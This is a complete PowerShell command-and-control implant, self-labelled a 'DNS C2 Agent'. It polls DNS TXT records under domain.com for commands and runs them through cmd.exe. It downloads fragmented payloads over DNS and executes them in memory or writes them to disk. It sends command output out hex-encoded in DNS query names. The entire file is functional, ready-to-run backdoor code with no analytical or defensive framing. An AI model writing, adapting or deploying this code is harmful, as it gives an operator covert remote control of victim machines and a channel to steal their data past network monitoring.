$BaseDomain = "domain.com"
$CommandSubdomain = "cmd"
$DataSubdomain = "data"
$DownloadSubdomain = "dl"
$SleepTimeSeconds = 15
$ExfilChunkSize = 50

function HexEncode([string]$Text) {
    $HexString = ""
    $CharArray = $Text.ToCharArray()
    foreach ($Char in $CharArray) {
        $HexString += '{0:x2}' -f [int][char]$Char
    }
    return $HexString
}

function Decompress-GzipData([byte[]]$CompressedData) {
    $InputStream = New-Object System.IO.MemoryStream(,$CompressedData)
    $GzipStream = New-Object System.IO.Compression.GzipStream($InputStream, [System.IO.Compression.CompressionMode]::Decompress)
    $OutputStream = New-Object System.IO.MemoryStream
    $Buffer = New-Object byte[] 4096
    while (($Read = $GzipStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $OutputStream.Write($Buffer, 0, $Read)
    }
    $GzipStream.Close()
    $InputStream.Close()
    return $OutputStream.ToArray()
}

function Get-StagedFile($FileId) {
    Write-Host "Downloading staged file: $FileId" -ForegroundColor Yellow
    
    $MetaFqdn = "0.$FileId.$DownloadSubdomain.$BaseDomain"
    
    try {
        $MetaRecord = Resolve-DnsName -Name $MetaFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
        $MetaData = ($MetaRecord | Where-Object { $_.Type -eq "TXT" }).Strings -join ''
        
        $MetaParts = $MetaData.Split('|')
        if ($MetaParts.Count -lt 4) {
            Write-Host "Invalid metadata format" -ForegroundColor Red
            return $null
        }
        
        $Action = $MetaParts[0]
        $TotalFragments = [int]$MetaParts[1]
        $Checksum = $MetaParts[2]
        $FileName = $MetaParts[3]

        $Destination = if ($MetaParts.Count -ge 5) { $MetaParts[4] -replace '\\\\', '\' } else { "" }
        
        Write-Host "  Action: $Action, Fragments: $TotalFragments, File: $FileName" -ForegroundColor Cyan
        
    } catch {
        Write-Host "Error fetching metadata: $_" -ForegroundColor Red
        return $null
    }
    
    $EncodedData = ""
    
    for ($i = 1; $i -le $TotalFragments; $i++) {
        $FragmentFqdn = "$i.$FileId.$DownloadSubdomain.$BaseDomain"
        
        $MaxRetries = 3
        $RetryCount = 0
        $Success = $false
        
        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            $RetryCount++
            Write-Host "  Fetching fragment $i/$TotalFragments (Attempt $RetryCount)" -ForegroundColor DarkGray
            
            try {
                $FragmentRecord = Resolve-DnsName -Name $FragmentFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
                $FragmentData = ($FragmentRecord | Where-Object { $_.Type -eq "TXT" }).Strings -join ''
                $EncodedData += $FragmentData
                $Success = $true
            } catch {
                Write-Host "    Failed attempt $RetryCount" -ForegroundColor Red
                if ($RetryCount -lt $MaxRetries) {
                    Start-Sleep -Milliseconds 500
                }
            }
        }
        
        if (-not $Success) {
            Write-Host "  FAILED to fetch fragment $i after $MaxRetries attempts" -ForegroundColor Red
            return $null
        }
        
        Start-Sleep -Milliseconds 100
    }
    
    Write-Host "  All fragments received. Decompressing..." -ForegroundColor Cyan
    
    try {
        $CompressedBytes = [System.Convert]::FromBase64String($EncodedData)
        $DecompressedBytes = Decompress-GzipData $CompressedBytes
        
        $ReceivedChecksum = ([System.BitConverter]::ToString((New-Object System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash($DecompressedBytes)) -replace '-','').Substring(0,8).ToLower()
        
        if ($ReceivedChecksum -ne $Checksum) {
            Write-Host "  Checksum mismatch! Expected: $Checksum, Got: $ReceivedChecksum" -ForegroundColor Red
            return $null
        }
        
        Write-Host "  Checksum verified: $ReceivedChecksum" -ForegroundColor Green
        
        return @{
            Action = $Action
            Data = $DecompressedBytes
            FileName = $FileName
            Destination = $Destination
        }
        
    } catch {
        Write-Host "  Error decompressing data: $_" -ForegroundColor Red
        return $null
    }
}

function Execute-StagedFile($FileData) {
    $Action = $FileData.Action
    $Data = $FileData.Data
    $FileName = $FileData.FileName
    $Destination = $FileData.Destination
    
    if ($Action -eq "EXEC") {
        Write-Host "Executing file in memory: $FileName" -ForegroundColor Yellow
        
        try {
            $Script = [System.Text.Encoding]::UTF8.GetString($Data)
            
            $ScriptBlock = [ScriptBlock]::Create($Script)
            $Output = & $ScriptBlock 2>&1 | Out-String
            
            if ([string]::IsNullOrWhiteSpace($Output)) {
                return "[EXEC] Script '$FileName' executed successfully (no output)"
            }
            return $Output.Trim()
            
        } catch {
            return "[EXEC ERROR] Script '$FileName' failed: $($_.Exception.Message)"
        }
        
    } elseif ($Action -eq "PUSH") {
        try {
            $FinalPath = $Destination
            if (Test-Path $Destination -PathType Container) {
                $FinalPath = Join-Path -Path $Destination -ChildPath $FileName
            } elseif ($Destination.EndsWith('\') -or $Destination.EndsWith('/')) {
                $FinalPath = Join-Path -Path $Destination -ChildPath $FileName
            }
            
            Write-Host "Saving file to: $FinalPath" -ForegroundColor Yellow
            
            $ParentDir = Split-Path -Parent $FinalPath
            if ($ParentDir -and -not (Test-Path $ParentDir)) {
                New-Item -ItemType Directory -Path $ParentDir -Force | Out-Null
            }
            
            [System.IO.File]::WriteAllBytes($FinalPath, $Data)
            return "File saved successfully to: $FinalPath ($($Data.Length) bytes)"
        } catch {
            return "Error saving file: $($_.Exception.Message)"
        }
        
    } else {
        return "Unknown action: $Action"
    }
}

function Do-Exfiltrate($SessionId, $CommandId, $Result) {
    Write-Host "Starting exfiltration for Session ID: $SessionId, Command ID: $CommandId" -ForegroundColor Yellow

    $HexResult = HexEncode($Result)
    Write-Host "Hex encoded length: $($HexResult.Length)" -ForegroundColor Cyan
    
    $Chunks = @()
    for ($i = 0; $i -lt $HexResult.Length; $i += $ExfilChunkSize) {
        $Remaining = $HexResult.Length - $i
        if ($Remaining -lt $ExfilChunkSize) {
            $ChunkLength = $Remaining
        } else {
            $ChunkLength = $ExfilChunkSize
        }
        $Chunks += $HexResult[$i..($i + $ChunkLength - 1)] -join ''
    }

    $TotalFragments = $Chunks.Count
    Write-Host "Total fragments to send: $TotalFragments" -ForegroundColor Cyan

    for ($i = 0; $i -lt $Chunks.Count; $i++) {
        $Chunk = $Chunks[$i]
        $SequenceNumber = $i + 1
        
        $FqdnToQuery = "$SequenceNumber-$TotalFragments-$CommandId-$Chunk.$SessionId.$DataSubdomain.$BaseDomain"
        
        $MaxRetries = 3
        $RetryCount = 0
        $Success = $false
        
        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            $RetryCount++
            Write-Host "Sending fragment $SequenceNumber/$TotalFragments (Attempt $RetryCount/$MaxRetries, CmdID: $CommandId)"
            
            try {
                $Response = Resolve-DnsName -Name $FqdnToQuery -Type A -DnsOnly -ErrorAction Stop
                $Success = $true
                Write-Host "  -> Fragment $SequenceNumber sent successfully" -ForegroundColor Green
            } catch {
                Write-Host "  -> Failed attempt $RetryCount for fragment $SequenceNumber" -ForegroundColor Red
                if ($RetryCount -lt $MaxRetries) {
                    Write-Host "  -> Retrying in 2 seconds..." -ForegroundColor Yellow
                    Start-Sleep -Seconds 2
                }
            }
        }
        
        if (-not $Success) {
            Write-Host "  -> FAILED to send fragment $SequenceNumber after $MaxRetries attempts!" -ForegroundColor Red
        }
        
        if ($i -lt ($Chunks.Count - 1)) {
            Write-Host "  -> Waiting 3 seconds before next fragment..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 3
        }
    }
    
    Write-Host "Exfiltration complete." -ForegroundColor Green
}


function Get-Nonce {
    return (Get-Random -Maximum 999999).ToString()
}

function Do-CheckIn {
    $Nonce = Get-Nonce
    $CommandFqdn = "$Nonce.$CommandSubdomain.$BaseDomain"
    
    Write-Host "Checking in with FQDN: $CommandFqdn..."
    
    try {
        $DnsRecord = Resolve-DnsName -Name $CommandFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
        
        foreach ($Record in $DnsRecord) {
            if ($Record.Type -eq "TXT") {
                $CommandPayload = $Record.Strings -join ' '
                
                if ($CommandPayload -match "^CMD:(\d+):(.*)") {
                    $CmdId = $matches[1].Trim()
                    $Command = $matches[2].Trim()
                    Write-Host "Received command ID: $CmdId, Command: $Command" -ForegroundColor Green
                    return @{ Id = $CmdId; Command = $Command }
                }
            }
        }

    } catch {
        Write-Host "Error during command check-in (likely no command available or server down)." -ForegroundColor Red
    }
    
    return $null
}

function Execute-Command($Command) {
    Write-Host "Executing: $Command" -ForegroundColor Yellow
    
    $ExecutionResult = ""
    try {
        $ExecutionResult = cmd.exe /c $Command 2>&1 | Out-String
    } catch {
        $ExecutionResult = "Error executing command: $($_.Exception.Message)"
    }
    
    return $ExecutionResult.Trim()
}

function Process-Command($CommandData) {
    $Command = $CommandData.Command
    
    if ($Command -match "^EXEC:([a-f0-9]+)$") {
        $FileId = $matches[1]
        Write-Host "EXEC command detected. File ID: $FileId" -ForegroundColor Cyan
        
        $FileData = Get-StagedFile $FileId
        if ($FileData) {
            return Execute-StagedFile $FileData
        } else {
            return "Failed to download staged file: $FileId"
        }
        
    } elseif ($Command -match "^PUSH:([a-f0-9]+)$") {
        $FileId = $matches[1]
        Write-Host "PUSH command detected. File ID: $FileId" -ForegroundColor Cyan
        
        $FileData = Get-StagedFile $FileId
        if ($FileData) {
            return Execute-StagedFile $FileData
        } else {
            return "Failed to download staged file: $FileId"
        }
        
    } else {
        return Execute-Command $Command
    }
}

Write-Host "Starting PowerShell DNS C2 Agent..." -ForegroundColor Green

$AgentID = $env:COMPUTERNAME
Write-Host "Agent ID: $AgentID"

$LastCommandId = ""

while ($true) {
    $CheckInResult = Do-CheckIn
    
    if ($CheckInResult -and $CheckInResult.Id -ne $LastCommandId) {
        $LastCommandId = $CheckInResult.Id
        Write-Host "New command detected (ID: $LastCommandId)" -ForegroundColor Cyan
        
        $Result = Process-Command $CheckInResult
        Do-Exfiltrate $AgentID $LastCommandId $Result
    } else {
        Write-Host "No new command. Agent alive." -ForegroundColor DarkGray
    }
    
    Write-Host "Sleeping for $SleepTimeSeconds seconds..."
    Start-Sleep -Seconds $SleepTimeSeconds
}